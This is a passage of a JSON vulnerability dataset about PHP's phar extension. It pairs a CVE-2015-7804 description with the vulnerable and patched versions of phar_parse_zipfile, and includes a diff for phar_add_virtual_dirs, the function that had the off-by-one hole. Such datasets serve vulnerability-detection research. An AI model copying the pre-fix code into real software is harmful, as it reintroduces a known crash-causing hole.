        "func": "void phar_add_virtual_dirs(phar_archive_data *phar, char *filename, int filename_len TSRMLS_DC) /* {{{ */\n{\n\tconst char *s;\n\n\twhile ((s = zend_memrchr(filename, '/', filename_len))) {\n\t\tfilename_len = s - filename;\n\t\tif (!filename_len || FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {\n\t\t\tbreak;\n\t\t}\n\t}\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -4,7 +4,7 @@\n \n \twhile ((s = zend_memrchr(filename, '/', filename_len))) {\n \t\tfilename_len = s - filename;\n-\t\tif (FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {\n+\t\tif (!filename_len || FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {\n \t\t\tbreak;\n \t\t}\n \t}",
        "diff_line_info": {
            "deleted_lines": [
                "\t\tif (FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {"
            ],
            "added_lines": [
                "\t\tif (!filename_len || FAILURE == zend_hash_add_empty_element(&phar->virtual_dirs, filename, filename_len)) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-7804",
        "func_name": "php/php-src/phar_parse_zipfile",
        "description": "Off-by-one error in the phar_parse_zipfile function in ext/phar/zip.c in PHP before 5.5.30 and 5.6.x before 5.6.14 allows remote attackers to cause a denial of service (uninitialized pointer dereference and application crash) by including the / filename in a .zip PHAR archive.",
        "git_url": "https://github.com/php/php-src/commit/1ddf72180a52d247db88ea42a3e35f824a8fbda1",
        "commit_title": "Better fix for bug #70433",
        "commit_text": "",
        "func_before": "int phar_parse_zipfile(php_stream *fp, char *fname, int fname_len, char *alias, int alias_len, phar_archive_data** pphar, char **error TSRMLS_DC) /* {{{ */\n{\n\tphar_zip_dir_end locator;\n\tchar buf[sizeof(locator) + 65536];\n\tlong size;\n\tphp_uint16 i;\n\tphar_archive_data *mydata = NULL;\n\tphar_entry_info entry = {0};\n\tchar *p = buf, *ext, *actual_alias = NULL;\n\tchar *metadata = NULL;\n\n\tsize = php_stream_tell(fp);\n\n\tif (size > sizeof(locator) + 65536) {\n\t\t/* seek to max comment length + end of central directory record */\n\t\tsize = sizeof(locator) + 65536;\n\t\tif (FAILURE == php_stream_seek(fp, -size, SEEK_END)) {\n\t\t\tphp_stream_close(fp);\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: unable to search for end of central directory in zip-based phar \\\"%s\\\"\", fname);\n\t\t\t}\n\t\t\treturn FAILURE;\n\t\t}\n\t} else {\n\t\tphp_stream_seek(fp, 0, SEEK_SET);\n\t}\n\n\tif (!php_stream_read(fp, buf, size)) {\n\t\tphp_stream_close(fp);\n\t\tif (error) {\n\t\t\tspprintf(error, 4096, \"phar error: unable to read in data to search for end of central directory in zip-based phar \\\"%s\\\"\", fname);\n\t\t}\n\t\treturn FAILURE;\n\t}\n\n\twhile ((p=(char *) memchr(p + 1, 'P', (size_t) (size - (p + 1 - buf)))) != NULL) {\n\t\tif (!memcmp(p + 1, \"K\\5\\6\", 3)) {\n\t\t\tmemcpy((void *)&locator, (void *) p, sizeof(locator));\n\t\t\tif (PHAR_GET_16(locator.centraldisk) != 0 || PHAR_GET_16(locator.disknumber) != 0) {\n\t\t\t\t/* split archives not handled */\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: split archives spanning multiple zips cannot be processed in zip-based phar \\\"%s\\\"\", fname);\n\t\t\t\t}\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\tif (PHAR_GET_16(locator.counthere) != PHAR_GET_16(locator.count)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: corrupt zip archive, conflicting file count in end of central directory record in zip-based phar \\\"%s\\\"\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\tmydata = pecalloc(1, sizeof(phar_archive_data), PHAR_G(persist));\n\t\t\tmydata->is_persistent = PHAR_G(persist);\n\n\t\t\t/* read in archive comment, if any */\n\t\t\tif (PHAR_GET_16(locator.comment_len)) {\n\n\t\t\t\tmetadata = p + sizeof(locator);\n\n\t\t\t\tif (PHAR_GET_16(locator.comment_len) != size - (metadata - buf)) {\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: corrupt zip archive, zip file comment truncated in zip-based phar \\\"%s\\\"\", fname);\n\t\t\t\t\t}\n\t\t\t\t\tphp_stream_close(fp);\n\t\t\t\t\tpefree(mydata, mydata->is_persistent);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\n\t\t\t\tmydata->metadata_len = PHAR_GET_16(locator.comment_len);\n\n\t\t\t\tif (phar_parse_metadata(&metadata, &mydata->metadata, PHAR_GET_16(locator.comment_len) TSRMLS_CC) == FAILURE) {\n\t\t\t\t\tmydata->metadata_len = 0;\n\t\t\t\t\t/* if not valid serialized data, it is a regular string */\n\n\t\t\t\t\tif (entry.is_persistent) {\n\t\t\t\t\t\tALLOC_PERMANENT_ZVAL(mydata->metadata);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tALLOC_ZVAL(mydata->metadata);\n\t\t\t\t\t}\n\n\t\t\t\t\tINIT_ZVAL(*mydata->metadata);\n\t\t\t\t\tmetadata = pestrndup(metadata, PHAR_GET_16(locator.comment_len), mydata->is_persistent);\n\t\t\t\t\tZVAL_STRINGL(mydata->metadata, metadata, PHAR_GET_16(locator.comment_len), 0);\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tmydata->metadata = NULL;\n\t\t\t}\n\n\t\t\tgoto foundit;\n\t\t}\n\t}\n\n\tphp_stream_close(fp);\n\n\tif (error) {\n\t\tspprintf(error, 4096, \"phar error: end of central directory not found in zip-based phar \\\"%s\\\"\", fname);\n\t}\n\n\treturn FAILURE;\nfoundit:\n\tmydata->fname = pestrndup(fname, fname_len, mydata->is_persistent);\n#ifdef PHP_WIN32\n\tphar_unixify_path_separators(mydata->fname, fname_len);\n#endif\n\tmydata->is_zip = 1;\n\tmydata->fname_len = fname_len;\n\text = strrchr(mydata->fname, '/');\n\n\tif (ext) {\n\t\tmydata->ext = memchr(ext, '.', (mydata->fname + fname_len) - ext);\n\t\tif (mydata->ext == ext) {\n\t\t\tmydata->ext = memchr(ext + 1, '.', (mydata->fname + fname_len) - ext - 1);\n\t\t}\n\t\tif (mydata->ext) {\n\t\t\tmydata->ext_len = (mydata->fname + fname_len) - mydata->ext;\n\t\t}\n\t}\n\n\t/* clean up on big-endian systems */\n\t/* seek to central directory */\n\tphp_stream_seek(fp, PHAR_GET_32(locator.cdir_offset), SEEK_SET);\n\t/* read in central directory */\n\tzend_hash_init(&mydata->manifest, PHAR_GET_16(locator.count),\n\t\tzend_get_hash_value, destroy_phar_manifest_entry, (zend_bool)mydata->is_persistent);\n\tzend_hash_init(&mydata->mounted_dirs, 5,\n\t\tzend_get_hash_value, NULL, (zend_bool)mydata->is_persistent);\n\tzend_hash_init(&mydata->virtual_dirs, PHAR_GET_16(locator.count) * 2,\n\t\tzend_get_hash_value, NULL, (zend_bool)mydata->is_persistent);\n\tentry.phar = mydata;\n\tentry.is_zip = 1;\n\tentry.fp_type = PHAR_FP;\n\tentry.is_persistent = mydata->is_persistent;\n#define PHAR_ZIP_FAIL_FREE(errmsg, save) \\\n\t\t\tzend_hash_destroy(&mydata->manifest); \\\n\t\t\tmydata->manifest.arBuckets = 0; \\\n\t\t\tzend_hash_destroy(&mydata->mounted_dirs); \\\n\t\t\tmydata->mounted_dirs.arBuckets = 0; \\\n\t\t\tzend_hash_destroy(&mydata->virtual_dirs); \\\n\t\t\tmydata->virtual_dirs.arBuckets = 0; \\\n\t\t\tphp_stream_close(fp); \\\n\t\t\tif (mydata->metadata) { \\\n\t\t\t\tzval_dtor(mydata->metadata); \\\n\t\t\t} \\\n\t\t\tif (mydata->signature) { \\\n\t\t\t\tefree(mydata->signature); \\\n\t\t\t} \\\n\t\t\tif (error) { \\\n\t\t\t\tspprintf(error, 4096, \"phar error: %s in zip-based phar \\\"%s\\\"\", errmsg, mydata->fname); \\\n\t\t\t} \\\n\t\t\tpefree(mydata->fname, mydata->is_persistent); \\\n\t\t\tif (mydata->alias) { \\\n\t\t\t\tpefree(mydata->alias, mydata->is_persistent); \\\n\t\t\t} \\\n\t\t\tpefree(mydata, mydata->is_persistent); \\\n\t\t\tefree(save); \\\n\t\t\treturn FAILURE;\n#define PHAR_ZIP_FAIL(errmsg) \\\n\t\t\tzend_hash_destroy(&mydata->manifest); \\\n\t\t\tmydata->manifest.arBuckets = 0; \\\n\t\t\tzend_hash_destroy(&mydata->mounted_dirs); \\\n\t\t\tmydata->mounted_dirs.arBuckets = 0; \\\n\t\t\tzend_hash_destroy(&mydata->virtual_dirs); \\\n\t\t\tmydata->virtual_dirs.arBuckets = 0; \\\n\t\t\tphp_stream_close(fp); \\\n\t\t\tif (mydata->metadata) { \\\n\t\t\t\tzval_dtor(mydata->metadata); \\\n\t\t\t} \\\n\t\t\tif (mydata->signature) { \\\n\t\t\t\tefree(mydata->signature); \\\n\t\t\t} \\\n\t\t\tif (error) { \\\n\t\t\t\tspprintf(error, 4096, \"phar error: %s in zip-based phar \\\"%s\\\"\", errmsg, mydata->fname); \\\n\t\t\t} \\\n\t\t\tpefree(mydata->fname, mydata->is_persistent); \\\n\t\t\tif (mydata->alias) { \\\n\t\t\t\tpefree(mydata->alias, mydata->is_persistent); \\\n\t\t\t} \\\n\t\t\tpefree(mydata, mydata->is_persistent); \\\n\t\t\treturn FAILURE;\n\n\t/* add each central directory item to the manifest */\n\tfor (i = 0; i < PHAR_GET_16(locator.count); ++i) {\n\t\tphar_zip_central_dir_file zipentry;\n\t\toff_t beforeus = php_stream_tell(fp);\n\n\t\tif (sizeof(zipentry) != php_stream_read(fp, (char *) &zipentry, sizeof(zipentry))) {\n\t\t\tPHAR_ZIP_FAIL(\"unable to read central directory entry, truncated\");\n\t\t}\n\n\t\t/* clean up for bigendian systems */\n\t\tif (memcmp(\"PK\\1\\2\", zipentry.signature, 4)) {\n\t\t\t/* corrupted entry */\n\t\t\tPHAR_ZIP_FAIL(\"corrupted central directory entry, no magic signature\");\n\t\t}\n\n\t\tif (entry.is_persistent) {\n\t\t\tentry.manifest_pos = i;\n\t\t}\n\n\t\tentry.compressed_filesize = PHAR_GET_32(zipentry.compsize);\n\t\tentry.uncompressed_filesize = PHAR_GET_32(zipentry.uncompsize);\n\t\tentry.crc32 = PHAR_GET_32(zipentry.crc32);\n\t\t/* do not PHAR_GET_16 either on the next line */\n\t\tentry.timestamp = phar_zip_d2u_time(zipentry.timestamp, zipentry.datestamp);\n\t\tentry.flags = PHAR_ENT_PERM_DEF_FILE;\n\t\tentry.header_offset = PHAR_GET_32(zipentry.offset);\n\t\tentry.offset = entry.offset_abs = PHAR_GET_32(zipentry.offset) + sizeof(phar_zip_file_header) + PHAR_GET_16(zipentry.filename_len) +\n\t\t\tPHAR_GET_16(zipentry.extra_len);\n\n\t\tif (PHAR_GET_16(zipentry.flags) & PHAR_ZIP_FLAG_ENCRYPTED) {\n\t\t\tPHAR_ZIP_FAIL(\"Cannot process encrypted zip files\");\n\t\t}\n\n\t\tif (!PHAR_GET_16(zipentry.filename_len)) {\n\t\t\tPHAR_ZIP_FAIL(\"Cannot process zips created from stdin (zero-length filename)\");\n\t\t}\n\n\t\tentry.filename_len = PHAR_GET_16(zipentry.filename_len);\n\t\tentry.filename = (char *) pemalloc(entry.filename_len + 1, entry.is_persistent);\n\n\t\tif (entry.filename_len != php_stream_read(fp, entry.filename, entry.filename_len)) {\n\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\tPHAR_ZIP_FAIL(\"unable to read in filename from central directory, truncated\");\n\t\t}\n\n\t\tentry.filename[entry.filename_len] = '\\0';\n\n\t\tif (entry.filename[entry.filename_len - 1] == '/') {\n\t\t\tentry.is_dir = 1;\n\t\t\tentry.filename_len--;\n\t\t\tentry.flags |= PHAR_ENT_PERM_DEF_DIR;\n\t\t} else {\n\t\t\tentry.is_dir = 0;\n\t\t}\n\n\t\tif (entry.filename_len == sizeof(\".phar/signature.bin\")-1 && !strncmp(entry.filename, \".phar/signature.bin\", sizeof(\".phar/signature.bin\")-1)) {\n\t\t\tsize_t read;\n\t\t\tphp_stream *sigfile;\n\t\t\toff_t now;\n\t\t\tchar *sig;\n\n\t\t\tnow = php_stream_tell(fp);\n\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\tsigfile = php_stream_fopen_tmpfile();\n\t\t\tif (!sigfile) {\n\t\t\t\tPHAR_ZIP_FAIL(\"couldn't open temporary file\");\n\t\t\t}\n\n\t\t\tphp_stream_seek(fp, 0, SEEK_SET);\n\t\t\t/* copy file contents + local headers and zip comment, if any, to be hashed for signature */\n\t\t\tphar_stream_copy_to_stream(fp, sigfile, entry.header_offset, NULL);\n\t\t\t/* seek to central directory */\n\t\t\tphp_stream_seek(fp, PHAR_GET_32(locator.cdir_offset), SEEK_SET);\n\t\t\t/* copy central directory header */\n\t\t\tphar_stream_copy_to_stream(fp, sigfile, beforeus - PHAR_GET_32(locator.cdir_offset), NULL);\n\t\t\tif (metadata) {\n\t\t\t\tphp_stream_write(sigfile, metadata, PHAR_GET_16(locator.comment_len));\n\t\t\t}\n\t\t\tphp_stream_seek(fp, sizeof(phar_zip_file_header) + entry.header_offset + entry.filename_len + PHAR_GET_16(zipentry.extra_len), SEEK_SET);\n\t\t\tsig = (char *) emalloc(entry.uncompressed_filesize);\n\t\t\tread = php_stream_read(fp, sig, entry.uncompressed_filesize);\n\t\t\tif (read != entry.uncompressed_filesize) {\n\t\t\t\tphp_stream_close(sigfile);\n\t\t\t\tefree(sig);\n\t\t\t\tPHAR_ZIP_FAIL(\"signature cannot be read\");\n\t\t\t}\n\t\t\tmydata->sig_flags = PHAR_GET_32(sig);\n\t\t\tif (FAILURE == phar_verify_signature(sigfile, php_stream_tell(sigfile), mydata->sig_flags, sig + 8, entry.uncompressed_filesize - 8, fname, &mydata->signature, &mydata->sig_len, error TSRMLS_CC)) {\n\t\t\t\tefree(sig);\n\t\t\t\tif (error) {\n\t\t\t\t\tchar *save;\n\t\t\t\t\tphp_stream_close(sigfile);\n\t\t\t\t\tspprintf(&save, 4096, \"signature cannot be verified: %s\", *error);\n\t\t\t\t\tefree(*error);\n\t\t\t\t\tPHAR_ZIP_FAIL_FREE(save, save);\n\t\t\t\t} else {\n\t\t\t\t\tphp_stream_close(sigfile);\n\t\t\t\t\tPHAR_ZIP_FAIL(\"signature cannot be verified\");\n\t\t\t\t}\n\t\t\t}\n\t\t\tphp_stream_close(sigfile);\n\t\t\tefree(sig);\n\t\t\t/* signature checked out, let's ensure this is the last file in the phar */\n\t\t\tif (i != PHAR_GET_16(locator.count) - 1) {\n\t\t\t\tPHAR_ZIP_FAIL(\"entries exist after signature, invalid phar\");\n\t\t\t}\n\n\t\t\tcontinue;\n\t\t}\n\n\t\tphar_add_virtual_dirs(mydata, entry.filename, entry.filename_len TSRMLS_CC);\n\n\t\tif (PHAR_GET_16(zipentry.extra_len)) {\n\t\t\toff_t loc = php_stream_tell(fp);\n\t\t\tif (FAILURE == phar_zip_process_extra(fp, &entry, PHAR_GET_16(zipentry.extra_len) TSRMLS_CC)) {\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"Unable to process extra field header for file in central directory\");\n\t\t\t}\n\t\t\tphp_stream_seek(fp, loc + PHAR_GET_16(zipentry.extra_len), SEEK_SET);\n\t\t}\n\n\t\tswitch (PHAR_GET_16(zipentry.compressed)) {\n\t\t\tcase PHAR_ZIP_COMP_NONE :\n\t\t\t\t/* compression flag already set */\n\t\t\t\tbreak;\n\t\t\tcase PHAR_ZIP_COMP_DEFLATE :\n\t\t\t\tentry.flags |= PHAR_ENT_COMPRESSED_GZ;\n\t\t\t\tif (!PHAR_G(has_zlib)) {\n\t\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\t\tPHAR_ZIP_FAIL(\"zlib extension is required\");\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase PHAR_ZIP_COMP_BZIP2 :\n\t\t\t\tentry.flags |= PHAR_ENT_COMPRESSED_BZ2;\n\t\t\t\tif (!PHAR_G(has_bz2)) {\n\t\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\t\tPHAR_ZIP_FAIL(\"bzip2 extension is required\");\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase 1 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (Shrunk) used in this zip\");\n\t\t\tcase 2 :\n\t\t\tcase 3 :\n\t\t\tcase 4 :\n\t\t\tcase 5 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (Reduce) used in this zip\");\n\t\t\tcase 6 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (Implode) used in this zip\");\n\t\t\tcase 7 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (Tokenize) used in this zip\");\n\t\t\tcase 9 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (Deflate64) used in this zip\");\n\t\t\tcase 10 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (PKWare Implode/old IBM TERSE) used in this zip\");\n\t\t\tcase 14 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (LZMA) used in this zip\");\n\t\t\tcase 18 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (IBM TERSE) used in this zip\");\n\t\t\tcase 19 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (IBM LZ77) used in this zip\");\n\t\t\tcase 97 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (WavPack) used in this zip\");\n\t\t\tcase 98 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (PPMd) used in this zip\");\n\t\t\tdefault :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (unknown) used in this zip\");\n\t\t}\n\n\t\t/* get file metadata */\n\t\tif (PHAR_GET_16(zipentry.comment_len)) {\n\t\t\tif (PHAR_GET_16(zipentry.comment_len) != php_stream_read(fp, buf, PHAR_GET_16(zipentry.comment_len))) {\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unable to read in file comment, truncated\");\n\t\t\t}\n\n\t\t\tp = buf;\n\t\t\tentry.metadata_len = PHAR_GET_16(zipentry.comment_len);\n\n\t\t\tif (phar_parse_metadata(&p, &(entry.metadata), PHAR_GET_16(zipentry.comment_len) TSRMLS_CC) == FAILURE) {\n\t\t\t\tentry.metadata_len = 0;\n\t\t\t\t/* if not valid serialized data, it is a regular string */\n\n\t\t\t\tif (entry.is_persistent) {\n\t\t\t\t\tALLOC_PERMANENT_ZVAL(entry.metadata);\n\t\t\t\t} else {\n\t\t\t\t\tALLOC_ZVAL(entry.metadata);\n\t\t\t\t}\n\n\t\t\t\tINIT_ZVAL(*entry.metadata);\n\t\t\t\tZVAL_STRINGL(entry.metadata, pestrndup(buf, PHAR_GET_16(zipentry.comment_len), entry.is_persistent), PHAR_GET_16(zipentry.comment_len), 0);\n\t\t\t}\n\t\t} else {\n\t\t\tentry.metadata = NULL;\n\t\t}\n\n\t\tif (!actual_alias && entry.filename_len == sizeof(\".phar/alias.txt\")-1 && !strncmp(entry.filename, \".phar/alias.txt\", sizeof(\".phar/alias.txt\")-1)) {\n\t\t\tphp_stream_filter *filter;\n\t\t\toff_t saveloc;\n\t\t\t/* verify local file header */\n\t\t\tphar_zip_file_header local;\n\n\t\t\t/* archive alias found */\n\t\t\tsaveloc = php_stream_tell(fp);\n\t\t\tphp_stream_seek(fp, PHAR_GET_32(zipentry.offset), SEEK_SET);\n\n\t\t\tif (sizeof(local) != php_stream_read(fp, (char *) &local, sizeof(local))) {\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"phar error: internal corruption of zip-based phar (cannot read local file header for alias)\");\n\t\t\t}\n\n\t\t\t/* verify local header */\n\t\t\tif (entry.filename_len != PHAR_GET_16(local.filename_len) || entry.crc32 != PHAR_GET_32(local.crc32) || entry.uncompressed_filesize != PHAR_GET_32(local.uncompsize) || entry.compressed_filesize != PHAR_GET_32(local.compsize)) {\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"phar error: internal corruption of zip-based phar (local header of alias does not match central directory)\");\n\t\t\t}\n\n\t\t\t/* construct actual offset to file start - local extra_len can be different from central extra_len */\n\t\t\tentry.offset = entry.offset_abs =\n\t\t\t\tsizeof(local) + entry.header_offset + PHAR_GET_16(local.filename_len) + PHAR_GET_16(local.extra_len);\n\t\t\tphp_stream_seek(fp, entry.offset, SEEK_SET);\n\t\t\t/* these next lines should be for php < 5.2.6 after 5.3 filters are fixed */\n\t\t\tfp->writepos = 0;\n\t\t\tfp->readpos = 0;\n\t\t\tphp_stream_seek(fp, entry.offset, SEEK_SET);\n\t\t\tfp->writepos = 0;\n\t\t\tfp->readpos = 0;\n\t\t\t/* the above lines should be for php < 5.2.6 after 5.3 filters are fixed */\n\n\t\t\tmydata->alias_len = entry.uncompressed_filesize;\n\n\t\t\tif (entry.flags & PHAR_ENT_COMPRESSED_GZ) {\n\t\t\t\tfilter = php_stream_filter_create(\"zlib.inflate\", NULL, php_stream_is_persistent(fp) TSRMLS_CC);\n\n\t\t\t\tif (!filter) {\n\t\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\t\tPHAR_ZIP_FAIL(\"unable to decompress alias, zlib filter creation failed\");\n\t\t\t\t}\n\n\t\t\t\tphp_stream_filter_append(&fp->readfilters, filter);\n\n\t\t\t\tif (!(entry.uncompressed_filesize = php_stream_copy_to_mem(fp, &actual_alias, entry.uncompressed_filesize, 0)) || !actual_alias) {\n\t\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\t\tPHAR_ZIP_FAIL(\"unable to read in alias, truncated\");\n\t\t\t\t}\n\n\t\t\t\tphp_stream_filter_flush(filter, 1);\n\t\t\t\tphp_stream_filter_remove(filter, 1 TSRMLS_CC);\n\n\t\t\t} else if (entry.flags & PHAR_ENT_COMPRESSED_BZ2) {\n\t\t\t\tfilter = php_stream_filter_create(\"bzip2.decompress\", NULL, php_stream_is_persistent(fp) TSRMLS_CC);\n\n\t\t\t\tif (!filter) {\n\t\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\t\tPHAR_ZIP_FAIL(\"unable to read in alias, bzip2 filter creation failed\");\n\t\t\t\t}\n\n\t\t\t\tphp_stream_filter_append(&fp->readfilters, filter);\n\n\t\t\t\tif (!(entry.uncompressed_filesize = php_stream_copy_to_mem(fp, &actual_alias, entry.uncompressed_filesize, 0)) || !actual_alias) {\n\t\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\t\tPHAR_ZIP_FAIL(\"unable to read in alias, truncated\");\n\t\t\t\t}\n\n\t\t\t\tphp_stream_filter_flush(filter, 1);\n\t\t\t\tphp_stream_filter_remove(filter, 1 TSRMLS_CC);\n\t\t\t} else {\n\t\t\t\tif (!(entry.uncompressed_filesize = php_stream_copy_to_mem(fp, &actual_alias, entry.uncompressed_filesize, 0)) || !actual_alias) {\n\t\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\t\tPHAR_ZIP_FAIL(\"unable to read in alias, truncated\");\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t/* return to central directory parsing */\n\t\t\tphp_stream_seek(fp, saveloc, SEEK_SET);\n\t\t}\n\n\t\tphar_set_inode(&entry TSRMLS_CC);\n\t\tzend_hash_add(&mydata->manifest, entry.filename, entry.filename_len, (void *)&entry,sizeof(phar_entry_info), NULL);\n\t}\n\n\tmydata->fp = fp;\n\n\tif (zend_hash_exists(&(mydata->manifest), \".phar/stub.php\", sizeof(\".phar/stub.php\")-1)) {\n\t\tmydata->is_data = 0;\n\t} else {\n\t\tmydata->is_data = 1;\n\t}\n\n\tzend_hash_add(&(PHAR_GLOBALS->phar_fname_map), mydata->fname, fname_len, (void*)&mydata, sizeof(phar_archive_data*), NULL);\n\n\tif (actual_alias) {\n\t\tphar_archive_data **fd_ptr;\n\n\t\tif (!phar_validate_alias(actual_alias, mydata->alias_len)) {\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: invalid alias \\\"%s\\\" in zip-based phar \\\"%s\\\"\", actual_alias, fname);\n\t\t\t}\n\t\t\tefree(actual_alias);\n\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), mydata->fname, fname_len);\n\t\t\treturn FAILURE;\n\t\t}\n\n\t\tmydata->is_temporary_alias = 0;\n\n\t\tif (SUCCESS == zend_hash_find(&(PHAR_GLOBALS->phar_alias_map), actual_alias, mydata->alias_len, (void **)&fd_ptr)) {\n\t\t\tif (SUCCESS != phar_free_alias(*fd_ptr, actual_alias, mydata->alias_len TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to add zip-based phar \\\"%s\\\" with implicit alias, alias is already in use\", fname);\n\t\t\t\t}\n\t\t\t\tefree(actual_alias);\n\t\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), mydata->fname, fname_len);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tmydata->alias = entry.is_persistent ? pestrndup(actual_alias, mydata->alias_len, 1) : actual_alias;\n\n\t\tif (entry.is_persistent) {\n\t\t\tefree(actual_alias);\n\t\t}\n\n\t\tzend_hash_add(&(PHAR_GLOBALS->phar_alias_map), actual_alias, mydata->alias_len, (void*)&mydata, sizeof(phar_archive_data*), NULL);\n\t} else {\n\t\tphar_archive_data **fd_ptr;\n\n\t\tif (alias_len) {\n\t\t\tif (SUCCESS == zend_hash_find(&(PHAR_GLOBALS->phar_alias_map), alias, alias_len, (void **)&fd_ptr)) {\n\t\t\t\tif (SUCCESS != phar_free_alias(*fd_ptr, alias, alias_len TSRMLS_CC)) {\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to add zip-based phar \\\"%s\\\" with explicit alias, alias is already in use\", fname);\n\t\t\t\t\t}\n\t\t\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), mydata->fname, fname_len);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tzend_hash_add(&(PHAR_GLOBALS->phar_alias_map), actual_alias, mydata->alias_len, (void*)&mydata, sizeof(phar_archive_data*), NULL);\n\t\t\tmydata->alias = pestrndup(alias, alias_len, mydata->is_persistent);\n\t\t\tmydata->alias_len = alias_len;\n\t\t} else {\n\t\t\tmydata->alias = pestrndup(mydata->fname, fname_len, mydata->is_persistent);\n\t\t\tmydata->alias_len = fname_len;\n\t\t}\n\n\t\tmydata->is_temporary_alias = 1;\n\t}\n\n\tif (pphar) {\n\t\t*pphar = mydata;\n\t}\n\n\treturn SUCCESS;\n}",
        "func": "int phar_parse_zipfile(php_stream *fp, char *fname, int fname_len, char *alias, int alias_len, phar_archive_data** pphar, char **error TSRMLS_DC) /* {{{ */\n{\n\tphar_zip_dir_end locator;\n\tchar buf[sizeof(locator) + 65536];\n\tlong size;\n\tphp_uint16 i;\n\tphar_archive_data *mydata = NULL;\n\tphar_entry_info entry = {0};\n\tchar *p = buf, *ext, *actual_alias = NULL;\n\tchar *metadata = NULL;\n\n\tsize = php_stream_tell(fp);\n\n\tif (size > sizeof(locator) + 65536) {\n\t\t/* seek to max comment length + end of central directory record */\n\t\tsize = sizeof(locator) + 65536;\n\t\tif (FAILURE == php_stream_seek(fp, -size, SEEK_END)) {\n\t\t\tphp_stream_close(fp);\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: unable to search for end of central directory in zip-based phar \\\"%s\\\"\", fname);\n\t\t\t}\n\t\t\treturn FAILURE;\n\t\t}\n\t} else {\n\t\tphp_stream_seek(fp, 0, SEEK_SET);\n\t}\n\n\tif (!php_stream_read(fp, buf, size)) {\n\t\tphp_stream_close(fp);\n\t\tif (error) {\n\t\t\tspprintf(error, 4096, \"phar error: unable to read in data to search for end of central directory in zip-based phar \\\"%s\\\"\", fname);\n\t\t}\n\t\treturn FAILURE;\n\t}\n\n\twhile ((p=(char *) memchr(p + 1, 'P', (size_t) (size - (p + 1 - buf)))) != NULL) {\n\t\tif (!memcmp(p + 1, \"K\\5\\6\", 3)) {\n\t\t\tmemcpy((void *)&locator, (void *) p, sizeof(locator));\n\t\t\tif (PHAR_GET_16(locator.centraldisk) != 0 || PHAR_GET_16(locator.disknumber) != 0) 